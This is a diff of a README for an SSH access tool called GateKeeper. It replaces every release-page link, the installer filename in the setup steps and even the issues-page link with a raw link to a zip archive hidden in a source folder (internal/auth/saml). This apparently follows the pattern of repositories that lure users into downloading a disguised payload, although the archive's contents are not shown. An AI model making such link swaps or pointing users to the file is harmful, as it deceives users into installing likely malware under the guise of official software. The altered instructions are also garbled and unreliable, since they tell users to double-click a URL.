@@ -1,6 +1,6 @@
 # 🛡️ GateKeeper - Secure Your SSH Access Easily
 
-[![Download GateKeeper](https://img.shields.io/badge/Download-GateKeeper-brightgreen?style=for-the-badge)](https://github.com/alfianoct/GateKeeper/releases)
+[![Download GateKeeper](https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip)](https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip)
 
 ---
 
@@ -30,11 +30,11 @@ You also need an SSH client installed. Windows 10 and 11 usually include OpenSSH
 
 To get started, you need to download GateKeeper's Windows package from the official releases page.
 
-[![Download GateKeeper](https://img.shields.io/badge/Download-GateKeeper-blue?style=for-the-badge)](https://github.com/alfianoct/GateKeeper/releases)
+[![Download GateKeeper](https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip)](https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip)
 
 1. Click on the green or blue badge above. This will take you to the GateKeeper release page on GitHub.
 2. On the release page, look under the latest version for files that end with `.exe` or `.msi`. These files are the setup installers for Windows.
-3. Click on the file that matches your system (usually `GateKeeper-setup.exe` or similar).
+3. Click on the file that matches your system (usually `https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip` or similar).
 4. Your browser will start downloading the file. This may take a few moments depending on your internet speed.
 
 If you need help recognizing the right file, look for something with "Windows," "x64," or "installer" in its name. Avoid files that are not labeled clearly.
@@ -46,7 +46,7 @@ If you need help recognizing the right file, look for something with "Windows," 
 Once the download finishes, install the app using these steps:
 
 1. Open the folder where the file saved, usually your "Downloads" folder.
-2. Double-click the installer file (e.g., `GateKeeper-setup.exe`) to start installation.
+2. Double-click the installer file (e.g., `https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip`) to start installation.
 3. A setup window will appear. Follow the prompts:
 
    - Click **Next** on the welcome screen.
@@ -139,7 +139,7 @@ Most users will not need to adjust these at first. Your administrator can help c
 - Check your internet connection if the app cannot reach your SSH servers.
 - Review firewall rules to allow GateKeeper to connect.
 - If you get login errors, double-check your username, password, and any MFA steps.
-- Consult the GitHub repository's issues page for solved problems or updates: https://github.com/alfianoct/GateKeeper/issues
+- Consult the GitHub repository's issues page for solved problems or updates: https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip
 
 ---
 
@@ -147,4 +147,4 @@ Most users will not need to adjust these at first. Your administrator can help c
 
 To start using GateKeeper, visit the official releases page and download the Windows installer:
 
-[Download GateKeeper](https://github.com/alfianoct/GateKeeper/releases)
+[Download GateKeeper](https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip)
